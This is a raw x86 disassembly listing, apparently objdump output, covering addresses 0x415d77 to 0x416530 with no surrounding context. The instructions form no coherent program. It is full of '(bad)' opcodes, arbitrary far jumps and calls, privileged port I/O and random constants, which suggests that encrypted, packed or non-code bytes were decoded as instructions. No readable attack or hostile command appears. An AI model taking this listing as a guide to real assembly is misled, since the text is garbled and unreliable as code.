  415d77:	dec    edi
  415d78:	mov    ch,0x74
  415d7a:	sbb    bh,BYTE PTR [edx-0x2b]
  415d7d:	cld    
  415d7e:	outs   dx,BYTE PTR ds:[esi]
  415d7f:	ror    eax,0x11
  415d82:	fdiv   QWORD PTR [edx+0x1c3561ae]
  415d88:	loopne 0x415dec
  415d8a:	pushf  
  415d8b:	push   eax
  415d8c:	lds    esp,FWORD PTR [edi]
  415d8e:	jp     0x415da8
  415d90:	dec    ebp
  415d91:	mul    DWORD PTR [ebp+0x65]
  415d94:	int3   
  415d95:	pusha  
  415d96:	push   ebp
  415d97:	es ror dh,1
  415d9a:	dec    esi
  415d9b:	scas   al,BYTE PTR es:[edi]
  415d9c:	jl     0x415de6
  415d9e:	fs inc edx
  415da0:	adc    DWORD PTR [ebx],ebp
  415da2:	jecxz  0x415dc0
  415da4:	xor    eax,0xf43e3918
  415da9:	cmc    
  415daa:	sbb    ebx,eax
  415dac:	sti    
  415dad:	out    0xa5,eax
  415daf:	scas   eax,DWORD PTR es:[edi]
  415db0:	mov    ds,WORD PTR [eax]
  415db2:	or     al,0xb7
  415db4:	and    al,0x1b
  415db6:	rep ins BYTE PTR es:[edi],dx
  415db8:	in     al,0x69
  415dba:	sub    esi,DWORD PTR [edx-0x8]
  415dbd:	je     0x415d4e
  415dbf:	sub    BYTE PTR [ebp+0x3c92b766],cl
  415dc5:	mov    dh,0x68
  415dc7:	sub    al,0xd8
  415dc9:	imul   esi,DWORD PTR [edi+0x10],0xa996d11e
  415dd0:	fst    QWORD PTR [edi+eax*2-0x5dc05c37]
  415dd7:	adc    eax,0xf707546e
  415ddc:	mov    dh,0xda
  415dde:	jns    0x415e39
  415de0:	stos   BYTE PTR es:[edi],al
  415de1:	ins    BYTE PTR es:[edi],dx
  415de2:	xchg   ebp,eax
  415de3:	add    BYTE PTR [edx],bh
  415de5:	cli    
  415de6:	mov    eax,DWORD PTR [eax]
  415de8:	ss push esp
  415dea:	aas    
  415deb:	dec    edi
  415dec:	inc    ebx
  415ded:	adc    eax,0x1712ca3c
  415df2:	or     ebx,DWORD PTR [edx]
  415df4:	retf   
  415df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415df6:	or     dh,al
  415df8:	cli    
  415df9:	pop    esp
  415dfa:	adc    BYTE PTR [eax+0x3dbdf6ca],ah
  415e00:	jne    0x415de0
  415e02:	fistp  WORD PTR [ebx]
  415e04:	mov    al,ds:0xb3263d0c
  415e09:	ficom  DWORD PTR [ebx+0x15]
  415e0c:	and    DWORD PTR [ebp+ebp*2+0x57e4d310],0x45075f3d
  415e17:	xor    eax,0x773bcd66
  415e1c:	push   ds
  415e1d:	lods   al,BYTE PTR ds:[esi]
  415e1e:	scas   eax,DWORD PTR es:[edi]
  415e1f:	adc    al,0xa3
  415e21:	add    BYTE PTR [ecx+0xe703025],0x4a
  415e28:	xor    eax,0xfecc35b9
  415e2d:	lds    ebx,FWORD PTR [edx]
  415e2f:	ss pop es
  415e31:	mov    DWORD PTR [edi],ebp
  415e33:	aad    0x64
  415e35:	(bad)  
  415e36:	das    
  415e37:	dec    ebx
  415e38:	add    al,0x97
  415e3a:	dec    DWORD PTR [ebx+0x4907e0b2]
  415e40:	mov    cl,0xe1
  415e42:	adc    al,0x90
  415e44:	pop    edx
  415e45:	test   esi,edx
  415e47:	push   es
  415e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e49:	in     eax,dx
  415e4a:	xchg   ecx,eax
  415e4b:	pop    esp
  415e4c:	icebp  
  415e4d:	data16 (bad) 
  415e4f:	and    eax,0xc683ac45
  415e54:	sub    dh,BYTE PTR [ebp-0x4d]
  415e57:	or     ebx,DWORD PTR ds:0x58262559
  415e5d:	pop    ss
  415e5e:	std    
  415e5f:	jecxz  0x415e95
  415e61:	retf   
  415e62:	pop    edi
  415e63:	adc    eax,0xf5f18079
  415e68:	lods   eax,DWORD PTR ds:[esi]
  415e69:	push   ebp
  415e6a:	mov    bl,0xb9
  415e6c:	lea    ebx,[ebx]
  415e6e:	sbb    dh,BYTE PTR [ecx]
  415e70:	adc    eax,0xd5522565
  415e75:	mov    dh,BYTE PTR [esp+ebp*2+0x2a7f9496]
  415e7c:	out    dx,eax
  415e7d:	aad    0xb7
  415e7f:	cld    
  415e80:	sbb    BYTE PTR [ebx-0x4ae457c4],ah
  415e86:	ret    
  415e87:	jle    0x415e69
  415e89:	rol    BYTE PTR [ebp-0x495c18c],cl
  415e8f:	push   esi
  415e90:	dec    esi
  415e91:	fdiv   st,st(5)
  415e93:	mov    bh,0x15
  415e95:	jmp    0xb9b0:0x6e908b54
  415e9c:	push   esi
  415e9d:	mov    ebp,0xb1ac78a
  415ea2:	data16 int3 
  415ea4:	jno    0x415e71
  415ea6:	ds push ecx
  415ea8:	aam    0x77
  415eaa:	mov    bl,0x12
  415eac:	inc    ecx
  415ead:	inc    ebx
  415eae:	dec    edx
  415eaf:	push   DWORD PTR [esi+0x516d26ac]
  415eb5:	xlat   BYTE PTR ds:[ebx]
  415eb6:	add    eax,0xc789e0ac
  415ebb:	std    
  415ebc:	stos   DWORD PTR es:[edi],eax
  415ebd:	inc    ebp
  415ebe:	mov    eax,0xed079e26
  415ec3:	pop    esp
  415ec4:	lods   eax,DWORD PTR ds:[esi]
  415ec5:	jg     0x415eb3
  415ec7:	leave  
  415ec8:	cwde   
  415ec9:	adc    bh,BYTE PTR [ebp-0x3d797b1c]
  415ecf:	pop    ebx
  415ed0:	push   es
  415ed1:	push   edx
  415ed2:	xchg   edi,edi
  415ed4:	repz sbb BYTE PTR [ebp+0x36],cl
  415ed8:	and    eax,DWORD PTR [edx+0x51]
  415edb:	cwde   
  415edc:	inc    ebx
  415edd:	ror    BYTE PTR [edi-0x58],0x16
  415ee1:	adc    al,0x94
  415ee3:	cmp    ebp,DWORD PTR [ecx+0xcbf5d95]
  415ee9:	aad    0x13
  415eeb:	sub    al,0x51
  415eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eee:	add    BYTE PTR [ecx+esi*2+0x7a],dh
  415ef2:	fst    QWORD PTR [ecx]
  415ef4:	retf   
  415ef5:	jae    0x415f31
  415ef7:	leave  
  415ef8:	xor    eax,0x78217709
  415efd:	loop   0x415ecb
  415eff:	fxch   st(6)
  415f01:	push   ss
  415f02:	leave  
  415f03:	mov    DWORD PTR [ecx-0x2a3bd9b6],ecx
  415f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f0a:	pop    es
  415f0b:	xor    eax,0x73fd142e
  415f10:	pop    es
  415f11:	pop    edx
  415f12:	pop    eax
  415f13:	mov    eax,0x1d466393
  415f18:	int    0xa6
  415f1a:	mov    ebp,DWORD PTR [esi-0x78]
  415f1d:	xor    eax,DWORD PTR [esi]
  415f1f:	xor    esp,eax
  415f21:	jle    0x415f56
  415f23:	loop   0x415eaa
  415f25:	inc    esi
  415f26:	and    eax,0xd8d803d1
  415f2b:	gs adc al,0x78
  415f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f2f:	int    0xbc
  415f31:	jmp    0x415f57
  415f33:	ins    DWORD PTR es:[edi],dx
  415f34:	pop    esi
  415f35:	test   al,0x3e
  415f37:	aam    0x26
  415f39:	push   eax
  415f3a:	push   0x42680ba9
  415f3f:	jbe    0x415f9e
  415f41:	pushf  
  415f42:	enter  0x7bfd,0xe7
  415f46:	add    al,0x26
  415f48:	push   edx
  415f49:	or     al,0x16
  415f4b:	mov    cl,BYTE PTR [esi+edi*4+0xf]
  415f4f:	cmc    
  415f50:	pusha  
  415f51:	add    BYTE PTR es:[esi],bl
  415f54:	adc    cl,bl
  415f56:	mov    eax,0xee99a85b
  415f5b:	ss gs loopne 0x415eeb
  415f5f:	out    dx,al
  415f60:	lea    edx,[edi+0x32]
  415f63:	retf   
  415f64:	dec    eax
  415f65:	rcr    dh,0x77
  415f68:	js     0x415fde
  415f6a:	cmp    edx,esi
  415f6c:	(bad)  
  415f6f:	outs   dx,DWORD PTR ds:[esi]
  415f70:	rcl    DWORD PTR [edx+eiz*2],cl
  415f73:	repnz imul ecx,DWORD PTR [ecx+0x35],0xffffffc1
  415f78:	mov    al,0x1e
  415f7a:	xor    ecx,DWORD PTR [eax-0x7d]
  415f7d:	sub    esp,DWORD PTR [ebp+0x7f]
  415f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f81:	sbb    al,0x5d
  415f83:	ss push cs
  415f85:	in     eax,0x6f
  415f87:	cwde   
  415f88:	out    dx,al
  415f89:	jle    0x415fe6
  415f8b:	test   al,0x4f
  415f8d:	stos   DWORD PTR es:[edi],eax
  415f8e:	mov    dl,0x58
  415f90:	data16 jg 0x415fae
  415f93:	xchg   ebx,eax
  415f94:	xor    eax,0xaeaee04f
  415f99:	xchg   DWORD PTR [ecx+0x2b],esp
  415f9c:	adc    ebp,DWORD PTR [ebx-0x7be2510c]
  415fa2:	mov    dl,BYTE PTR [ebp+0x73e0bf4b]
  415fa8:	sbb    ecx,DWORD PTR [ecx]
  415faa:	pop    ebx
  415fab:	mov    ebx,0x66e4f077
  415fb0:	cmc    
  415fb1:	push   ecx
  415fb2:	cdq    
  415fb3:	jb     0x415f57
  415fb5:	not    BYTE PTR [edi-0x3495afad]
  415fbb:	js     0x415ff0
  415fbd:	mov    DWORD PTR [ebx-0x62],ebp
  415fc0:	jle    0x415f9c
  415fc2:	inc    ebp
  415fc3:	cli    
  415fc4:	loope  0x416002
  415fc6:	sbb    DWORD PTR [esi+0x55],ecx
  415fc9:	add    esi,DWORD PTR [ebx-0x1f7d87d6]
  415fcf:	(bad)  
  415fd0:	in     eax,dx
  415fd1:	and    al,bl
  415fd3:	outs   dx,DWORD PTR ds:[esi]
  415fd4:	dec    esi
  415fd5:	sti    
  415fd6:	adc    bl,BYTE PTR [edx+0x63]
  415fd9:	sar    ebp,cl
  415fdb:	push   edi
  415fdc:	inc    edi
  415fdd:	inc    ebx
  415fde:	test   eax,0xc05b1fbe
  415fe3:	fnstenv [edi]
  415fe5:	inc    eax
  415fe6:	xchg   edx,eax
  415fe7:	retf   0x592f
  415fea:	jb     0x415f96
  415fec:	fcmovnu st,st(6)
  415fee:	ds loope 0x416056
  415ff1:	pusha  
  415ff2:	dec    esi
  415ff3:	ds ins WORD PTR es:[edi],dx
  415ff6:	retf   
  415ff7:	push   esi
  415ff8:	jle    0x415fbf
  415ffa:	call   0x7f7858fe
  415fff:	ins    BYTE PTR es:[edi],dx
  416000:	enter  0x5c29,0xf5
  416004:	push   cs
  416005:	sbb    bl,BYTE PTR [ecx+0x18]
  416008:	pop    esp
  416009:	dec    eax
  41600a:	imul   ebx,DWORD PTR [ebp+eiz*8+0x6b4450f6],0xf769f14a
  416015:	out    dx,eax
  416016:	sahf   
  416017:	jnp    0x415ff3
  416019:	dec    esi
  41601a:	out    dx,al
  41601b:	rcr    DWORD PTR [edi-0x7b],1
  41601e:	iret   
  41601f:	push   ds
  416020:	subps  xmm2,xmm0
  416023:	mov    ebp,0x1cdd99ca
  416028:	cmp    al,0xb5
  41602a:	pop    esp
  41602b:	inc    edi
  41602c:	dec    ebx
  41602d:	cmp    edx,ecx
  41602f:	lds    edx,FWORD PTR [esi]
  416031:	les    eax,FWORD PTR [esi]
  416033:	jb     0x416016
  416035:	and    cl,BYTE PTR [ebx-0x14]
  416038:	mov    ecx,0x2fecb97f
  41603d:	(bad)  
  41603e:	rcr    DWORD PTR [ecx+0x47],1
  416041:	ror    BYTE PTR [ecx+eiz*2-0x78],0x2e
  416046:	dec    edi
  416048:	rcr    BYTE PTR [eax-0x503b4aa2],1
  41604e:	rol    al,0x4c
  416051:	fs test al,0x42
  416054:	xchg   BYTE PTR [ecx+0x44],bh
  416057:	jmp    0x6503d52d
  41605c:	xlat   BYTE PTR ds:[ebx]
  41605d:	cmp    eax,esi
  41605f:	rol    DWORD PTR [ebx+0x52],cl
  416062:	pusha  
  416063:	push   cs
  416064:	xor    dh,BYTE PTR [eax+0x655f054d]
  41606a:	jmp    0x12c96cd
  41606f:	std    
  416070:	xor    eax,0xf5a803ab
  416075:	jnp    0x41606c
  416077:	add    eax,0x2dceaf98
  41607c:	jae    0x41609b
  41607e:	adc    DWORD PTR [ebp-0x3d195ce2],ebp
  416084:	xchg   edi,eax
  416085:	xor    BYTE PTR [edi+eax*2-0x2d],bl
  416089:	mov    ds:0x7667c19f,al
  41608e:	iret   
  41608f:	aam    0xf4
  416091:	inc    esi
  416092:	lds    esp,FWORD PTR [edx]
  416094:	inc    edi
  416095:	adc    al,0xd0
  416097:	loopne 0x41608b
  416099:	mov    DWORD PTR [eax],edi
  41609b:	mov    eax,ds:0xa911f0d3
  4160a0:	je     0x4160eb
  4160a2:	pop    ss
  4160a3:	lods   eax,DWORD PTR ds:[esi]
  4160a4:	mov    edx,0xf7291ec5
  4160a9:	dec    eax
  4160aa:	shl    DWORD PTR [edx-0x54],1
  4160ad:	cs mov ecx,0xb17ce813
  4160b3:	(bad)  
  4160b4:	jp     0x4160ed
  4160b6:	dec    ebx
  4160b7:	fwait
  4160b8:	mul    DWORD PTR [edx+0x19]
  4160bb:	push   ebp
  4160bc:	and    ecx,ebx
  4160be:	xor    BYTE PTR [ebx],cl
  4160c0:	aad    0x5d
  4160c2:	jge    0x4160f9
  4160c4:	fldenv [ebx+0x57]
  4160c7:	push   edx
  4160c8:	imul   ebp,DWORD PTR [ebx],0xea690dfd
  4160ce:	pop    ecx
  4160cf:	cmp    DWORD PTR [edx+0x2e],ecx
  4160d2:	dec    edx
  4160d3:	mov    ds:0x95be08b0,eax
  4160d8:	or     ah,al
  4160da:	or     BYTE PTR [ebp-0x32],dh
  4160dd:	mov    esi,0xe0f34475
  4160e2:	mov    esi,0xd1010c8c
  4160e7:	loope  0x416118
  4160e9:	into   
  4160ea:	popa   
  4160eb:	mov    edi,0x1e9b5fc2
  4160f0:	hlt    
  4160f1:	xor    eax,0x5f9b93b5
  4160f6:	lock dec ebp
  4160f8:	sbb    DWORD PTR [ecx],0x69456ce0
  4160fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160ff:	jmp    0xa55234f2
  416104:	mov    ds:0x33eaf24e,eax
  416109:	lea    edx,[ebx]
  41610b:	mov    edi,0x6f81d31c
  416110:	jg     0x4160e2
  416112:	int    0x4e
  416114:	jmp    0x4160b2
  416116:	loope  0x4160b3
  416118:	jo     0x4160d3
  41611a:	mov    eax,0xea0f4ebb
  41611f:	retf   0x5804
  416122:	mov    eax,0xf722952d
  416127:	mov    dl,0xdb
  416129:	jmp    0xf2cc:0x97b45653
  416130:	js     0x4160d2
  416132:	dec    edi
  416133:	call   0x769bc3f0
  416138:	mov    dh,0x11
  41613a:	ret    
  41613b:	push   esp
  41613c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41613d:	sbb    al,0x52
  41613f:	mov    ds:0xbde29e5d,al
  416144:	loop   0x416124
  416146:	and    eax,0xf531ac55
  41614b:	(bad)  
  41614c:	sub    ebp,DWORD PTR [ecx]
  41614e:	dec    esi
  41614f:	mov    edx,DWORD PTR [esi]
  416151:	shr    BYTE PTR [ebp+0x7a],cl
  416154:	int3   
  416155:	cli    
  416156:	lods   eax,DWORD PTR ds:[esi]
  416157:	or     eax,0x52dcf341
  41615c:	cmp    eax,DWORD PTR [edi+edi*4]
  41615f:	jl     0x416121
  416161:	jg     0x41610d
  416163:	jecxz  0x4161d9
  416165:	dec    edx
  416166:	mov    esi,0xd2cc3e4c
  41616b:	xchg   edi,ecx
  41616d:	ror    DWORD PTR [edx],1
  41616f:	or     ebx,ebp
  416171:	sub    BYTE PTR [ebx+ecx*4+0x26],0x71
  416176:	test   BYTE PTR [ebx+0x11],ah
  416179:	stc    
  41617a:	jmp    FWORD PTR [edx+eiz*4-0x75257829]
  416181:	push   edi
  416182:	js     0x4161a3
  416184:	aad    0x7a
  416186:	cmp    ah,BYTE PTR [esi+edi*4+0x2c]
  41618a:	xchg   esp,eax
  41618b:	add    esi,edx
  41618d:	repz cmp al,0x44
  416190:	jnp    0x4161d8
  416192:	test   BYTE PTR [eax+0x6],ah
  416195:	test   BYTE PTR [edx-0x45f5ede4],dh
  41619b:	mov    BYTE PTR [esi-0x3e908183],al
  4161a1:	in     eax,dx
  4161a2:	int3   
  4161a3:	arpl   WORD PTR [edx+0x4c],bx
  4161a6:	mov    dh,0x6a
  4161a8:	xor    eax,0x22fdd058
  4161ad:	into   
  4161ae:	sub    edx,ecx
  4161b0:	or     DWORD PTR [edx-0x1],esi
  4161b3:	mov    ?,WORD PTR [esi]
  4161b5:	sbb    eax,0x1b621440
  4161ba:	cmp    DWORD PTR [ebp+0x6571f24c],ebx
  4161c0:	scas   eax,DWORD PTR es:[edi]
  4161c1:	mov    edi,0xed9a9ca0
  4161c6:	pushf  
  4161c7:	mov    eax,ds:0x43c7525c
  4161cc:	mov    edi,0x5013b5c0
  4161d1:	or     bh,BYTE PTR [ebx-0x62]
  4161d4:	sti    
  4161d5:	stos   BYTE PTR es:[edi],al
  4161d6:	xchg   edx,eax
  4161d7:	icebp  
  4161d8:	inc    edi
  4161d9:	mov    esi,0x88a661ca
  4161de:	inc    ebp
  4161df:	add    dh,BYTE PTR [eax+ebx*8-0x9a0aad8]
  4161e6:	mov    ecx,edi
  4161e8:	add    eax,0x81afd603
  4161ed:	loope  0x416258
  4161ef:	fnclex 
  4161f1:	inc    esp
  4161f2:	push   ecx
  4161f3:	dec    esp
  4161f4:	fwait
  4161f5:	paddsb mm2,QWORD PTR [eax-0x66ce1d8b]
  4161fc:	fstp   QWORD PTR [ebp+0x30]
  4161ff:	add    eax,0x7e0798db
  416204:	int    0x2c
  416206:	sbb    al,0x68
  416208:	icebp  
  416209:	mov    dh,0x32
  41620b:	mov    al,0x59
  41620d:	xchg   esp,eax
  41620e:	dec    eax
  41620f:	pushf  
  416210:	arpl   WORD PTR [edx],cx
  416212:	rol    DWORD PTR [esi-0x1a],1
  416215:	xchg   ebx,eax
  416216:	push   edi
  416217:	mov    edx,edi
  416219:	std    
  41621a:	sub    esp,DWORD PTR [ecx]
  41621c:	imul   esi,DWORD PTR [ebx],0xee7e2033
  416222:	or     BYTE PTR [esi+0x34],dh
  416225:	ret    
  416226:	fldenv [edx-0x4bf48ab4]
  41622c:	retf   
  41622d:	clc    
  41622e:	push   eax
  41622f:	out    0x37,al
  416231:	jnp    0x4162aa
  416233:	hlt    
  416234:	mov    bh,0x53
  416236:	sub    dh,BYTE PTR [edx+0x5968046d]
  41623c:	fwait
  41623d:	jmp    0xb116:0x9bf27bea
  416244:	hlt    
  416245:	ss aad 0x6f
  416248:	aam    0x16
  41624a:	sbb    edx,DWORD PTR [eax]
  41624c:	mov    edx,0x901b6828
  416251:	jmp    0x330b:0x5c50b491
  416258:	je     0x416246
  41625a:	loope  0x4161fb
  41625c:	or     ch,BYTE PTR [ebp-0x641d5712]
  416262:	jmp    0x9daf:0x9f81f0e4
  416269:	neg    esp
  41626b:	cmp    eax,0xf9591cb5
  416270:	jno    0x416265
  416272:	fucom  st(1)
  416274:	adc    BYTE PTR [ebx+0x4d],bh
  416277:	and    DWORD PTR [ecx+0x1fc88184],esi
  41627d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41627e:	inc    edx
  41627f:	mov    eax,ds:0x7300703a
  416284:	mov    ch,0x65
  416286:	lods   eax,DWORD PTR ds:[esi]
  416287:	bsr    edx,DWORD PTR [ecx+0x3ced15b5]
  41628e:	out    0xe9,eax
  416290:	inc    ebp
  416291:	or     DWORD PTR [ebx-0x3d],esp
  416294:	fcomp  QWORD PTR [ebp*8-0x1192b3ed]
  41629b:	sbb    eax,0xa7c3a7b0
  4162a0:	and    BYTE PTR [ecx-0x30],cl
  4162a3:	(bad)  
  4162a4:	arpl   WORD PTR [edx-0x1c8c21d3],di
  4162aa:	fcomip st,st(3)
  4162ac:	aas    
  4162ad:	cmp    eax,0xf7d60813
  4162b2:	test   eax,0x4db13624
  4162b7:	pop    ebx
  4162b8:	mov    ch,0x20
  4162ba:	push   es
  4162bb:	sub    ah,BYTE PTR [edx]
  4162bd:	in     al,0xbd
  4162bf:	or     ecx,DWORD PTR [eax-0x608934f]
  4162c5:	es pop ss
  4162c7:	int    0x9b
  4162c9:	mov    al,0x85
  4162cb:	fistp  QWORD PTR [ebx]
  4162cd:	inc    esi
  4162ce:	add    ah,BYTE PTR [esi]
  4162d0:	xchg   ebp,eax
  4162d1:	sub    BYTE PTR [esi],ah
  4162d3:	clc    
  4162d4:	ins    BYTE PTR es:[edi],dx
  4162d5:	inc    eax
  4162d6:	sub    edx,DWORD PTR [eax+0x25]
  4162d9:	in     eax,dx
  4162da:	icebp  
  4162db:	or     cl,bl
  4162dd:	xchg   ecx,eax
  4162de:	sub    BYTE PTR [esi+0x40],dh
  4162e1:	scas   eax,DWORD PTR es:[edi]
  4162e2:	adc    ebp,ecx
  4162e4:	push   edi
  4162e5:	or     ecx,edx
  4162e7:	or     BYTE PTR [eax+esi*1],0x75
  4162eb:	adc    edx,ecx
  4162ed:	nop
  4162ee:	and    DWORD PTR [eax+edx*1],ebp
  4162f1:	fwait
  4162f2:	aaa    
  4162f3:	and    BYTE PTR [ebx],bl
  4162f5:	jnp    0x416364
  4162f7:	xor    DWORD PTR [esi+edx*4],edx
  4162fa:	push   esi
  4162fb:	mov    bl,0x9d
  4162fd:	push   edx
  4162fe:	popa   
  4162ff:	dec    eax
  416300:	ja     0x4162c7
  416302:	cmp    cl,BYTE PTR [edx+0x69]
  416305:	xor    edx,DWORD PTR [esi-0x6d4dff72]
  41630b:	aas    
  41630c:	fnsave [eax+0x24e367d7]
  416312:	rcr    DWORD PTR [eax-0x3e],cl
  416315:	push   ebx
  416316:	and    eax,0xfb711b2a
  41631b:	inc    ebp
  41631c:	push   0xffffffa5
  41631e:	mov    DWORD PTR [ebx-0x41d4cac2],0x32b4186d
  416328:	mov    al,BYTE PTR [ebp-0x29e7905e]
  41632e:	adc    DWORD PTR [edx-0x40d477fd],ecx
  416334:	ins    BYTE PTR es:[edi],dx
  416335:	sub    eax,0xfa0996ed
  41633a:	jmp    0x4162e5
  41633c:	sar    DWORD PTR [ebp-0x115364c7],cl
  416342:	xchg   edx,eax
  416343:	out    dx,eax
  416344:	popa   
  416345:	mov    ds:0x9e5318ff,eax
  41634a:	rcl    BYTE PTR [esi+0x34531d58],1
  416350:	in     eax,0x11
  416352:	lahf   
  416353:	dec    ecx
  416354:	inc    ebp
  416355:	mov    ch,0x3a
  416357:	cli    
  416358:	jmp    0xe930:0xfc8ef17d
  41635f:	(bad)  
  416360:	iret   
  416361:	repnz mov bl,0x76
  416364:	xchg   ebp,eax
  416365:	sub    ebp,ecx
  416367:	call   DWORD PTR [edx]
  416369:	and    bl,BYTE PTR [edx]
  41636b:	int    0x25
  41636d:	jl     0x41632c
  41636f:	adc    dh,BYTE PTR [edi-0x43]
  416372:	scas   eax,DWORD PTR es:[edi]
  416373:	fwait
  416374:	inc    esp
  416375:	cmp    ah,BYTE PTR [ebx]
  416377:	aad    0x65
  416379:	pop    ebp
  41637a:	enter  0x229a,0x57
  41637e:	mov    DWORD PTR [edi-0x38],edx
  416381:	jmp    0x3a31:0x31f3503f
  416388:	test   BYTE PTR [edi+0x2b],cl
  41638b:	ja     0x4163a3
  41638d:	mov    al,ds:0x3e22ea52
  416392:	or     al,0x62
  416394:	stos   DWORD PTR es:[di],eax
  416396:	xchg   ebx,eax
  416397:	xor    BYTE PTR ds:0x5dff0b04,ah
  41639d:	push   edi
  41639e:	sub    BYTE PTR [ebx-0xd],0x12
  4163a2:	cmp    al,0x5e
  4163a4:	loopne 0x416420
  4163a6:	mov    esi,0xd1f9d00c
  4163ab:	arpl   WORD PTR [esi+0x6c],bx
  4163ae:	push   ds
  4163af:	cmp    DWORD PTR [edx-0x3dfd9aaa],ebp
  4163b5:	aam    0xfb
  4163b7:	xchg   ebp,eax
  4163b8:	xchg   dh,cl
  4163ba:	ins    BYTE PTR es:[edi],dx
  4163bb:	imul   esp,DWORD PTR [ecx-0x6f6a9510],0xffffffd4
  4163c2:	test   DWORD PTR ds:0x86ce9fe2,ebp
  4163c8:	pop    edi
  4163c9:	mov    esp,0x38da38e2
  4163ce:	and    esi,esp
  4163d0:	xchg   esp,eax
  4163d1:	adc    eax,DWORD PTR [ecx+0x68d0e508]
  4163d7:	xor    ecx,ecx
  4163d9:	out    0x4,al
  4163db:	ja     0x416397
  4163dd:	pop    edx
  4163de:	gs out dx,al
  4163e0:	jl     0x416370
  4163e2:	jo     0x41637d
  4163e4:	dec    edx
  4163e5:	test   eax,0x29d1225d
  4163ea:	stc    
  4163eb:	xor    ecx,DWORD PTR [ecx-0x57]
  4163ee:	push   ds
  4163ef:	test   eax,0xf2161263
  4163f4:	pop    edx
  4163f5:	push   edx
  4163f6:	mov    edi,ebx
  4163f8:	mov    bl,0x49
  4163fa:	sub    BYTE PTR [ecx+esi*8+0x52069cc0],0xc4
  416402:	jnp    0x416404
  416404:	repz (bad) 
  416406:	das    
  416407:	inc    ecx
  416408:	push   ss
  416409:	in     eax,0x85
  41640b:	lods   al,BYTE PTR ds:[esi]
  41640c:	jle    0x4163b5
  41640e:	ret    0xc26a
  416411:	cli    
  416412:	std    
  416413:	pop    eax
  416414:	fild   WORD PTR [ebp+0x70db58b1]
  41641a:	mov    al,BYTE PTR [ebx-0x1a]
  41641d:	xchg   edx,eax
  41641e:	imul   eax,DWORD PTR [edx],0x98d2ef5d
  416424:	dec    edi
  416425:	xor    eax,0xf283ec50
  41642a:	je     0x4163ce
  41642c:	push   cs
  41642d:	pushf  
  41642e:	sahf   
  41642f:	(bad)  
  416430:	es ret 
  416432:	imul   esp,eax
  416435:	adc    bh,ah
  416437:	dec    edx
  416438:	jmp    0x89e5:0xa7a300d5
  41643f:	popf   
  416440:	cdq    
  416441:	xor    ebp,0xfadd903f
  416447:	pop    esi
  416448:	ds mov ebp,0x18151124
  41644e:	ins    DWORD PTR es:[edi],dx
  41644f:	sbb    eax,0x4eed7396
  416454:	shl    al,cl
  416456:	stc    
  416457:	popf   
  416458:	pushf  
  416459:	push   ss
  41645a:	cmp    ebx,DWORD PTR [ebx+0x21]
  41645d:	ror    BYTE PTR [ebx],1
  41645f:	pop    eax
  416460:	idiv   DWORD PTR ds:0xaf700bee
  416466:	js     0x4164d8
  416468:	cli    
  416469:	iret   
  41646a:	outs   dx,DWORD PTR ds:[esi]
  41646b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41646d:	lods   al,BYTE PTR ds:[esi]
  41646e:	inc    ebp
  41646f:	(bad)  
  416470:	xchg   ebx,eax
  416471:	pop    ds
  416472:	scas   al,BYTE PTR es:[edi]
  416473:	xchg   edx,eax
  416474:	pop    edx
  416475:	jp     0x41649d
  416477:	mov    eax,0x61a0afb6
  41647c:	sbb    al,0xf8
  41647e:	scas   eax,DWORD PTR es:[edi]
  41647f:	cmp    al,0x9b
  416481:	test   ebp,ebx
  416483:	push   0xffffffef
  416485:	and    cl,BYTE PTR [eax+0x6b3680c5]
  41648b:	call   0xa7e9:0x33947ede
  416492:	add    al,0xae
  416494:	fisttp DWORD PTR [ecx+0x57f08ae2]
  41649a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41649b:	out    dx,al
  41649c:	mov    ?,edx
  41649e:	jg     0x4164ef
  4164a0:	stos   BYTE PTR es:[edi],al
  4164a1:	inc    edi
  4164a2:	aam    0xab
  4164a4:	mov    bl,0xc2
  4164a6:	enter  0xe19,0x3e
  4164aa:	les    esi,FWORD PTR [ecx+0xa]
  4164ad:	adc    al,0x52
  4164af:	lock and BYTE PTR cs:[edx],ah
  4164b3:	dec    ebp
  4164b4:	push   ecx
  4164b5:	ins    BYTE PTR es:[edi],dx
  4164b6:	(bad)  
  4164b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164b8:	das    
  4164b9:	ret    0x7844
  4164bc:	inc    ebp
  4164bd:	mov    BYTE PTR [edi+0x4d],ah
  4164c0:	push   0xffffffac
  4164c2:	push   0xe1d209fe
  4164c7:	retf   0xd9b0
  4164ca:	sub    BYTE PTR [edx],cl
  4164cc:	cmc    
  4164cd:	sbb    eax,0xbf733ed
  4164d2:	push   esp
  4164d3:	push   es
  4164d4:	adc    al,0xc7
  4164d6:	fnsave [eax]
  4164d8:	mov    ebp,0xd2dfd88c
  4164dd:	jge    0x4164f7
  4164df:	fucomi st,st(5)
  4164e1:	jbe    0x416539
  4164e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e4:	sbb    al,0xa1
  4164e6:	inc    esp
  4164e7:	cmc    
  4164e8:	sub    al,0x91
  4164ea:	cmp    BYTE PTR [edi+0x52aabfe5],al
  4164f0:	popa   
  4164f1:	jle    0x416520
  4164f3:	push   cs
  4164f4:	repnz mov ecx,0xb0894ef3
  4164fa:	jle    0x4164e2
  4164fc:	dec    esi
  4164fd:	jno    0x416483
  4164ff:	mov    DWORD PTR [esi-0x4367ba36],ebx
  416505:	call   0x2cb082f6
  41650a:	and    al,0x9e
  41650c:	jge    0x416577
  41650e:	(bad)  [ecx-0x3e]
  416511:	jecxz  0x416507
  416513:	sbb    al,0x98
  416515:	fmul   st(5),st
  416517:	mov    edi,fs
  416519:	mov    ecx,0xd153316d
  41651e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41651f:	add    DWORD PTR [ebp+0x447a56ec],edx
  416525:	inc    ebx
  416526:	(bad)  
  416527:	call   0xf041b781
  41652c:	mov    al,0x8f
  41652e:	daa    
  41652f:	push   es
  416530:	lea    ebp,[eax+eax*1+0xd]
